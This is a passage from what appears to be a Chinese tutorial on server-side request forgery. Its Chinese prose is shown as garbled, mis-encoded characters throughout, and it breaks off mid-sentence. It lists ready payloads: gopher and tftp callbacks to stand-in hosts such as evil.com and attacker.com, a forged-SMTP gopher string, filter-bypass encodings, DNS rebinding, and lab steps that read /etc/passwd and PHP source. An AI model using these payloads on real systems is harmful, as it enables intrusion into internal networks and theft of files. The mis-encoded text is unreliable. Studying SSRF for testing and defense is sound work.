LDAPä»£è¡¨è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚å®ƒæ˜¯IPç½‘ç»œä¸Šçš„ä¸€ç§ç”¨äºç®¡ç†å’Œè®¿é—®åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡çš„åº”ç”¨ç¨‹åºåè®®ã€‚ http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit 5.5 tftp:// TFTPï¼ˆTrivial File Transfer Protocol,ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç®€å•çš„åŸºäºlockstepæœºåˆ¶çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯ä»è¿œç¨‹ä¸»æœºè·å–æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ è‡³è¿œç¨‹ä¸»æœºã€‚ http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET evil.com:# nc -lvup 1337 Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3 5.6 gopher:// Gopheræ˜¯ä¸€ç§åˆ†å¸ƒå¼æ–‡æ¡£ä¼ é€’æœåŠ¡ã€‚åˆ©ç”¨è¯¥æœåŠ¡ï¼Œç”¨æˆ·å¯ä»¥æ— ç¼åœ°æµè§ˆã€æœç´¢å’Œæ£€ç´¢é©»ç•™åœ¨ä¸åŒä½ç½®çš„ä¿¡æ¯ã€‚ Gopher åè®®å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œç‰¹åˆ«æ˜¯åœ¨ SSRF ä¸­å¯ä»¥å‘æŒ¥å¾ˆå¤šé‡è¦çš„ä½œç”¨ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ FTPã€Telnetã€Redisã€Memcacheï¼Œä¹Ÿå¯ä»¥è¿›è¡Œ GETã€POST è¯·æ±‚ã€‚ http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?&gt; evil.com:# nc -lvp 1337 Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest å…­ã€SSRFæ¼æ´åˆ©ç”¨ï¼ˆå±å®³ï¼‰ 1.å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯; 2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰; 3.å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°; 4.æ”»å‡»å†…å¤–ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨getå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚struts2ï¼Œsqliç­‰ï¼‰; 5.åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ã€‚. 6.å„ä¸ªåè®®è°ƒç”¨æ¢é’ˆï¼šhttp,file,dict,ftp,gopherç­‰ http:192.168.64.144/phpmyadmin/ file:///D:/www.txt dict://192.168.64.144:3306/info ftp://192.168.64.144:21 ä¸ƒã€æ¼æ´çš„éªŒè¯ï¼š æ ¹æ®æ¼æ´äº§ç”Ÿçš„åŸç†ï¼Œå¯¹æ‰€æˆ‘ä»¬æ‰€æµ‹è¯•çš„åœ°æ–¹è¿›è¡Œä¸€ä¸ªåˆ†æ é¦–å…ˆè¿™ä¸ªåœ°æ–¹åº”è¯¥æ˜¯æœåŠ¡å™¨Aè¯·æ±‚è®¿é—®ä»¥å¤–çš„æœåŠ¡ç«¯Bï¼Œè€Œä¸æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨Aå‘èµ·è¯·æ±‚ ä½¿ç”¨æ’é™¤æ³•ï¼šçœ‹URLåœ°å€ä¸­æœ‰æ²¡æœ‰åŒ…å«å…¶ä»–URLåœ°å€ï¼Œå†çœ‹æ•°æ®åŒ…çš„è¯·æ±‚ æ–¹æ³•ä¸€ï¼šå¯¹URLåœ°å€è¿›è¡Œåˆ†æ æˆ‘åœ¨ç½‘ä¸Šéšä¾¿æ‰¾äº†ä¸€å¼ å›¾ç‰‡ï¼Œå³é”®æ–°æ ‡ç­¾æ‰“å¼€å å¯¹URLåœ°å€è¿›è¡Œäº†è§£ç ï¼Œå°±çœ‹è§äº†2ä¸ªåŒ…å«çš„URLåœ°å€ æ–¹æ³•äºŒï¼šå¯¹æ•°æ®åŒ…è¿›è¡Œåˆ†æ å…¶å®ä¹Ÿå¯ä»¥ä½¿ç”¨burpsuiteæŠ“åŒ…è¿›è¡Œåˆ†æ è¿™é‡Œç›´æ¥çœ‹è§äº†æ–‡ä»¶çš„URLæ˜¯å…¶ä»–ç½‘ç«™æ¥çš„ å…«ã€åˆ©ç”¨æ­¥éª¤ ç¬¬ä¸€æ­¥ï¼šåˆ†ææ˜¯å¦å¯èƒ½å­˜åœ¨SSRF ï¼ˆä¸€èˆ¬è¦æµ‹è¯•3ä¸ªå‡½æ•°curl_execã€file_get_contentã€fsockopenæ˜¯å¦èƒ½æ‰§è¡ŒæˆåŠŸï¼‰ ç¬¬äºŒæ­¥ï¼šæµ‹è¯•æ˜¯å“ªç§å‡½æ•°å¼•èµ·çš„SSRFæ¼æ´ å¯¹ç«¯å£è¿›è¡Œä¸€ä¸ªæ¢æµ‹ï¼ˆhttpåè®®ï¼‰ï¼Œèƒ½å¤Ÿæ¢æµ‹åˆ°å†…å®¹ï¼Œè¯´æ˜å­˜åœ¨SSRFæ¼æ´ï¼Œå¹¶ä¸”è¿›ä¸€æ­¥å°è¯•å…¶ä»–æ“ä½œ å†…ç½‘åº”ç”¨æŒ‡çº¹è¯†åˆ«ï¼ˆhttpåè®®ï¼‰ è¯»å–æ–‡ä»¶ï¼ˆfileåè®®ï¼‰ å…·ä½“å‚è€ƒï¼šhttps://blog.csdn.net/qq_53079406/article/details/124005258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168112506716800215018171%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168112506716800215018171&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-124005258-null-null.142 ä¹ã€ç»•è¿‡æ–¹å¼ éƒ¨åˆ†å­˜åœ¨æ¼æ´ï¼Œæˆ–è€…å¯èƒ½äº§ç”ŸSSRFçš„åŠŸèƒ½ä¸­åšäº†ç™½åå•æˆ–è€…é»‘åå•çš„å¤„ç†ï¼Œæ¥è¾¾åˆ°é˜»æ­¢å¯¹å†…ç½‘æœåŠ¡å’Œèµ„æºçš„æ”»å‡»å’Œè®¿é—®ã€‚å› æ­¤æƒ³è¦è¾¾åˆ°SSRFçš„æ”»å‡»ï¼Œéœ€è¦å¯¹è¯·æ±‚çš„å‚æ•°åœ°å€åšç›¸å…³çš„ç»•è¿‡å¤„ç†ï¼Œå¸¸è§çš„ç»•è¿‡æ–¹å¼å¦‚ä¸‹ï¼š ä¸€ã€å¸¸è§çš„ç»•è¿‡æ–¹å¼ 1ã€é™åˆ¶ä¸ºhttp://www.xxx.com åŸŸåæ—¶ï¼ˆåˆ©ç”¨@ä¸/#/ï¼‰ å¯ä»¥å°è¯•é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ å¦‚ï¼šhttp://www.aaa.com@www.bbb.com@www.ccc.comï¼Œåœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ åœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«www.ccc.comï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸ºwww.bbb.comã€‚ /#/ç¬¦:ç»•è¿‡åç¼€ ä¸€èˆ¬ç”¨äº.jpgç­‰å›ºå®šåç¼€ä¸å¯æ›´æ”¹ ä¾‹å¦‚http://10.10.10.10:5001/#/abc.jpgï¼Œå®é™…åœ¨æµè§ˆå™¨è®¿é—®çš„æ˜¯ http://10.10.10.10:5001 2.é‡‡ç”¨çŸ­ç½‘å€ç»•è¿‡ æ¯”å¦‚ç™¾åº¦çŸ­åœ°å€https://dwz.cn/ 3.é‡‡ç”¨è¿›åˆ¶è½¬æ¢ 127.0.0.1å…«è¿›åˆ¶ï¼š0177.0.0.1ã€‚åå…­è¿›åˆ¶ï¼š0x7f.0.0.1ã€‚åè¿›åˆ¶ï¼š2130706433. IPåœ°å€è½¬ä¸ºå…«ã€åã€åå…­è¿›åˆ¶åŠIPåœ°å€çœç•¥å†™æ³•ï¼ˆä»¥ä¸‹å‡ä»£è¡¨127.0.0.1ï¼‰ 0177.00.00.01 2130706433 0x7f.0x0.0x0.0x1 127.1 4.åˆ©ç”¨ç‰¹æ®ŠåŸŸå åŸç†æ˜¯DNSè§£æã€‚xip.ioå¯ä»¥æŒ‡å‘ä»»æ„åŸŸåï¼Œå³ 127.0.0.1.xip.ioï¼Œå¯è§£æä¸º127.0.0.1 (xip.io ç°åœ¨å¥½åƒç”¨ä¸äº†äº†ï¼Œå¯ä»¥æ‰¾æ‰¾å…¶ä»–çš„) http://www.owasp.org.127.0.0.1.xip.io/ 5.åˆ©ç”¨[::]ç»•è¿‡localhost å¯ä»¥åˆ©ç”¨[::]æ¥ç»•è¿‡localhost http://169.254.169.254&gt;&gt;http://[::169.254.169.254] http://[::1] http://[::]:80/ http://0:80 6.åˆ©ç”¨å¥å· 127ã€‚0ã€‚0ã€‚1 &gt;&gt;&gt; 127.0.0.1 7.CRLF ç¼–ç ç»•è¿‡ %0d-&gt;0x0d-&gt;\\rå›è½¦ %0a-&gt;0x0a-&gt; æ¢è¡Œ è¿›è¡ŒHTTPå¤´éƒ¨æ³¨å…¥ example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a 8.åˆ©ç”¨å°é—­çš„å­—æ¯æ•°å­— åˆ©ç”¨Enclosed alphanumerics â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ &gt;&gt;&gt; example.com http://169.254.169.254&gt;&gt;&gt;http://[::â‘ â‘¥â‘¨ï½¡â‘¡â‘¤â‘£ï½¡â‘¯â‘¨ï½¡â‘¡â‘¤â‘£] List: â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿ 9.é…ç½®åŸŸå æ‰‹ä¸Šæœ‰å¯æ§åŸŸåï¼Œå¯å°†åŸŸåæŒ‡å‘æƒ³è¦è¯·æ±‚çš„IP 10.åº“ç»•è¿‡ åˆ©ç”¨æ£€æµ‹æ—¶ä½¿ç”¨çš„URL parseåº“ä¸è¯·æ±‚æ—¶ä½¿ç”¨çš„parseåº“çš„å·®å¼‚ç»•è¿‡ï¼Œå¦‚ http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/ ä¸åŒçš„parseåº“çš„è§£æç»“æœä¸ä¸€æ · urllib2 : 1.1.1.1 requests + browsers : 2.2.2.2 urllib : 3.3.3.3 11.dnsé‡å®šå‘ç»•è¿‡ ä¸€èˆ¬è¿›è¡Œ ssrf é˜²å¾¡çš„æ¨¡å¼å¦‚ä¸‹ï¼š 1. è·å–åˆ°è¾“å…¥çš„URLï¼Œä»è¯¥URLä¸­æå–host å¯¹è¯¥hostè¿›è¡ŒDNSè§£æï¼Œè·å–åˆ°è§£æçš„IP 2. è®¿é—®è§„åˆ™åˆ¤æ–­è¯¥IPæ˜¯å¦åœ¨æŒ‡å®šèŒƒå›´å†…ï¼ˆå³åˆ¤æ–­IPæ˜¯å¦ç¬¦åˆè§„åˆ™ï¼‰ å¦‚æœIPåœ¨èŒƒå›´å†…ï¼Œå³å¯¹æ­¤URLå‘èµ·è¯·æ±‚ å¦‚æœIPä¸åœ¨èŒƒå›´å†…ï¼Œåˆ™è¯·æ±‚å¤±è´¥ ç„¶è€Œè®¿é—®è§„åˆ™åœ¨åˆ¤æ®µå¾—åˆ°çš„IPä¸ºæŒ‡å®šèŒƒå›´å†…IPï¼Œåˆ°æœåŠ¡ç«¯è¯·æ±‚URLè¿™ä¸ªä¸­é—´è¿˜å­˜åœ¨ä¸€ä¸ªç»†å¾®çš„æ—¶é—´å·®ï¼Œ DNSé‡ç»‘å®šåˆ™æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè®©æœåŠ¡å™¨ç¬¬ä¸€æ¬¡è§£æhostçš„ipä¸ºç¬¦åˆè§„åˆ™çš„å…¬ç½‘IPï¼Œåœ¨ç¬¬äºŒæ¬¡è¯·æ±‚è§£æURLæ—¶hostçš„ipåˆå˜ä¸ºäº†ä¸ç¬¦åˆè§„åˆ™çš„å†…ç½‘IPï¼Œä»è€Œè¿›è¡Œssrfã€‚ è¿™é‡Œæ¨èä½¿ç”¨burpsuiteçš„intruderæ¨¡å—ï¼Œæ¥æ‰¹é‡å‘é€è¯·æ±‚ï¼Œä»¥åˆ©ç”¨æ—¶é—´å·®å®Œæˆssrfã€‚ åœ¨çº¿DNSé‡ç»‘å®šå¹³å°ï¼šhttps://lock.cmpxchg8b.com/rebinder.html 12.æ”»å‡»æœ¬åœ° http://127.0.0.1:80 http://localhost:22 13.åˆ©ç”¨ä¸Šä¼  ä¹Ÿä¸ä¸€å®šæ˜¯ä¸Šä¼ ï¼Œæˆ‘ä¹Ÿè¯´ä¸æ¸…ï¼Œè‡ªå·±ä½“ä¼š -.- ä¿®æ”¹\"type=file\"ä¸º\"type=url\" æ¯”å¦‚ï¼š ä¸Šä¼ å›¾ç‰‡å¤„ä¿®æ”¹ä¸Šä¼ ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘SSRF 14.åˆ©ç”¨åè®® Dict:// dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt; ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 15.302é‡å®šå‘ éœ€è¦ä¸€ä¸ªvpsï¼ŒæŠŠ302è½¬æ¢çš„ä»£ç éƒ¨ç½²åˆ°vpsä¸Šï¼Œç„¶åå»è®¿é—®ï¼Œå°±å¯è·³è½¬åˆ°å†…ç½‘ä¸­ æœåŠ¡ç«¯ä»£ç å¦‚ä¸‹ï¼š &lt;?php header(\"Location: http://192.168.1.10\"); exit(); ?&gt; 16.ä½¿ç”¨ç»„åˆ å„ç§ç»•è¿‡è¿›è¡Œè‡ªç”±ç»„åˆå³å¯ åã€SSRFæ¼é˜²å¾¡ é€šå¸¸æœ‰ä»¥ä¸‹5ä¸ªæ€è·¯ï¼š 1.è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚ 2.ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚ 3.é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ï¼Œ80,443,8080,8090ã€‚ 4.é»‘åå•å†…ç½‘ï¼Œé¿å…åº”ç”¨è¢«ç”¨æ¥è·å–è·å–å†…ç½‘æ•°æ®ï¼Œæ”»å‡»å†…ç½‘ã€‚ 5.ç¦ç”¨ä¸éœ€è¦çš„åè®®ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile:///,gopher://,ftp:// ç­‰å¼•èµ·çš„é—®é¢˜ã€‚ 6.å»é™¤urlä¸­çš„ç‰¹æ®Šå­—ç¬¦ 7.ä¸è·Ÿéš30xè·³è½¬ï¼ˆè·Ÿéšè·³è½¬éœ€è¦ä»1å¼€å§‹é‡æ–°æ£€æµ‹ï¼‰ 8.è¯·æ±‚æ—¶è®¾ç½®host headerä¸ºip åä¸€ã€é¶åœºå®æˆ˜ 1. SSRF-curl ç¬¬ä¸€æ­¥ï¼šåˆ†ææ˜¯å¦å¯èƒ½å­˜åœ¨SSRF ï¼ˆä¸€èˆ¬è¦æµ‹è¯•3ä¸ªå‡½æ•°curl_execã€file_get_contentã€fsockopenæ˜¯å¦èƒ½æ‰§è¡ŒæˆåŠŸï¼‰ ç‚¹å‡»å®ƒ å‘ç°æ˜¯URLä¼ é€’çš„ ï¼ˆå¦‚æœæ— æ³•æ˜¾ç¤ºï¼Œå°±åœ¨127.0.0.1åé¢åŠ ä¸Šç«¯å£å·ï¼‰ ç¬¬äºŒæ­¥ï¼šæµ‹è¯•æ˜¯å“ªç§å‡½æ•°å¼•èµ·çš„SSRFæ¼æ´ è¿™æ˜¯ä¸ªSSRFï¼ˆcurlï¼‰é¶åœºï¼Œå°±ä¸åšè¿‡å¤šæµ‹è¯• å‡½æ•°ä¸åŒæ‰€æ”¯æŒçš„åŠŸèƒ½ä¹Ÿå­˜åœ¨å·®åˆ« å¯¹ç«¯å£è¿›è¡Œä¸€ä¸ªæ¢æµ‹ï¼ˆhttpåè®®ï¼‰(å½“ç„¶å®æˆ˜è¿‡ç¨‹ä¸­è‚¯å®šè¦å¯¹ç«¯å£è¿›è¡Œçˆ†ç ´ï¼Œå“åº”æ—¶é—´é•¿çš„ç«¯å£å°±æ˜¯å¯ä»¥è®¿é—®çš„ç«¯å£) http://localhost:8080/pikachu-master/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306 èƒ½å¤Ÿæ¢æµ‹åˆ°å†…å®¹ï¼Œè¯´æ˜å­˜åœ¨SSRFæ¼æ´ï¼Œå¹¶ä¸”è¿›ä¸€æ­¥å°è¯•å…¶ä»–æ“ä½œ å†…ç½‘åº”ç”¨æŒ‡çº¹è¯†åˆ«ï¼ˆhttpåè®®ï¼‰ ï¼ˆè¿™ä¸ªæˆ‘åœ¨å°è¯•çš„æ—¶å€™ï¼Œå¦‚æœåŸæ–‡ä»¶å¸¦äº†ç‰ˆæœ¬å·ï¼Œè¯»å–çš„æ—¶å€™ä¹Ÿè¦å¸¦ï¼Œå¤§å°å†™ä¸ä¸€æ ·ä¸å½±å“ï¼‰ è¯»å–æ–‡ä»¶ï¼ˆfileåè®®ï¼‰ 2. SSRF-file_get_contents ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´ ä¸Šä¸€é¢˜æ˜¯urlï¼Œè¿™ä¸€é¢˜æ˜¯fileå‡½æ•° ä½†æ˜¯æ“ä½œè¿˜æ˜¯åŸºæœ¬ç±»ä¼¼ 8.2.2ã€ç¬¬äºŒæ­¥ï¼šåˆ©ç”¨æ¼æ´ è¯»å–phpæºç  http://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php å†ä½¿ç”¨base64è§£å¯†å³å¯å¾—åˆ°æºç  &lt;?php /** * Created by runner.han * There is nothing new under the sun */ $SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1); if ($SELF_PAGE = \"ssrf.php\"){ $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''); } $PIKA_ROOT_DIR = \"../../\"; include_once $PIKA_ROOT_DIR.'header.php'; ?&gt; &lt;div class=\"main-content\"&gt; &lt;div class=\"main-content-inner\"&gt; &lt;div class=\"breadcrumbs ace-save-state\" id=\"breadcrumbs\"&gt; &lt;ul class=\"breadcrumb\"&gt; &lt;li&gt; &lt;i class=\"ace-icon fa fa-home home-icon\"&gt;&lt;/i&gt; &lt;a href=\"ssrf.php\"&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=\"active\"&gt;æ¦‚è¿°&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=\"page-content\"&gt; &lt;b&gt;SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )&lt;/b&gt; &lt;p&gt;å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯&lt;b&gt;æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½&lt;/b&gt;,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶&lt;/p&gt; å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®&lt;br&gt; &lt;br&gt; æ•°æ®æµ:æ”»å‡»è€…-----&gt;æœåŠ¡å™¨----&gt;ç›®æ ‡åœ°å€&lt;br&gt; &lt;br&gt; æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ · &lt;pre style=\"width: 500px;\"&gt; PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF: file_get_contents() fsockopen() curl_exec() &lt;/pre&gt;&lt;br&gt; å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(\"æˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚\")çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,&lt;b&gt;åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤&lt;/b&gt;ã€‚ &lt;br&gt; &lt;br&gt; ä½ å¯ä»¥æ ¹æ®\"SSRF\"é‡Œé¢çš„é¡¹ç›®æ¥ææ‡‚é—®é¢˜çš„åŸå›  &lt;/div&gt;&lt;!-- /.page-content --&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- /.main-content --&gt; &lt;?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?&gt; è¯»å–æœ¬åœ°hostç­‰æ–‡ä»¶ http://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=file://c:\\windows\\system32\\drivers\\etc\\hosts 3. SSRF-labå®æˆ˜ å¯åˆ©ç”¨çš„ä¸»è¦å°±å‡ ä¸ªåè®®å§ file åè®®ç»“åˆç›®å½•éå†è¯»å–æ–‡ä»¶ã€‚ gopher åè®®æ‰“å¼€ç«¯å£ã€‚ dict åè®®ä¸»è¦ç”¨äºç»“åˆ curl æ”»å‡»ã€‚ http åè®®è¿›è¡Œå†…ç½‘æ¢æµ‹ã€‚ SSRF-Lab æ­å»ºæ•™ç¨‹ï¼šhttps://drun1baby.top/2022/05/16/SSRF-Labç¯å¢ƒæ­å»º/ 3.1 fileåè®®åˆ©ç”¨ ä½¿ç”¨ file åè®®è¿›è¡Œçš„ä»»æ„æ–‡ä»¶è¯»å–ç®—æ˜¯ ssrf æœ€ç®€å•çš„åˆ©ç”¨æ–¹å¼äº† é¦–å…ˆå…ˆå†™ä¸€æ®µæœ‰ ssrf æ¼æ´çš„ä»£ç ï¼Œå‘½åä¸º ssrf.php å¹¶éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚ ç”¨ file åè®®ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°èƒ½æˆåŠŸåˆ©ç”¨ ssrf æ¼æ´è¯»å–æ–‡ä»¶ã€‚file åè®®çš„æ ¼å¼ä¸ºï¼šfile:// æ–‡ä»¶è·¯å¾„ è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„æœåŠ¡å™¨è¯»å–ä¸åˆ°å†…ç½‘æ–‡ä»¶ï¼Œå…ˆå€Ÿç”¨ä½¬çš„å›¾ç‰‡äº† Payload file:///etc/passwd # file:// ä¹‹åå¯ä»¥æ¥ä»»æ„æ–‡ä»¶ è¿™é‡Œçš„ Payload åªæ˜¯ä¸€ä¸ªåŸºç¡€ç¤ºèŒƒï¼Œè¿˜å¯ä»¥è¯»å–å¾ˆå¤šæ–‡ä»¶ï¼Œåœ¨å®æˆ˜æ¸—é€å½“ä¸­ï¼Œæ›´å¤šæƒ…å†µåº”è¯¥æ˜¯é€šè¿‡ GET è¯·æ±‚æ”»å‡»çš„ã€‚ http://ip/index.php?url=file:///etc/passwd è€Œåœ¨ SSRF-Lab å½“ä¸­è¾ƒç®€å•ï¼Œåœ¨æ¡†ä¸­è¾“å…¥file:///etc/passwdå³å¯ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œåˆ©ç”¨è¿™ä¸ªåè®®å¯ä»¥è¯»å–ä¸»æœºå†…ä»»æ„æ–‡ä»¶ã€‚æ¥ä¸‹æ¥å¯ä»¥è¯»å–é…ç½®æ–‡ä»¶å’Œæºä»£ç æ–¹ä¾¿è¿›ä¸€æ­¥çš„æ¸—é€ï¼Œè¿™é‡Œä¹‹æ‰€ä»¥æˆåŠŸå®ç°æ˜¯å› ä¸ºURLæ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æ‰å¯ä»¥åˆ©ç”¨è¿™ä¸ªåè®®è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚ 3.2 httpåè®®ç ”ç©¶ http åè®®çš„åˆ©ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å‘ç›®æ ‡å‘é€ http è¯·æ±‚ï¼Œç”±äº get è¯·æ±‚çš„å‚æ•°æ˜¯ç›´æ¥åŠ åœ¨ url é‡Œçš„ï¼Œæ‰€ä»¥å¯ä»¥æ¢æµ‹å†…ç½‘é‚£äº›ä½¿ç”¨ get è¯·æ±‚å³å¯æ”»å‡»çš„åº”ç”¨ã€‚ ä½¿ç”¨ nc 